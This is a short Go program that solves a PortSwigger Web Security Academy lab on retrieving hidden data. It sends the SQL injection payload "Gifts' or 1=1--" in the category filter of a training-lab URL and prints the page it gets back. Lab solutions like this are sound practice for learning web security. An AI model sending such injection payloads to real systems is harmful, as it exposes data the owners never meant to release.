// https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data

package main

import (
	"fmt"
	"net/http"
	"log"
	"io"
	"net/url"
)

func main() {
	err := solve()
	if err != nil {
		log.Fatalln(err)
	}
}

func solve() error {
	client := &http.Client{}

	domain := "https://0a06001b03526b04c07004ae00980099.web-security-academy.net"
	resp, err := client.Get(domain + "/filter?category=" + url.QueryEscape("Gifts' or 1=1--"))
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return err
	}
	_, err = fmt.Println(string(body))
	return err
}

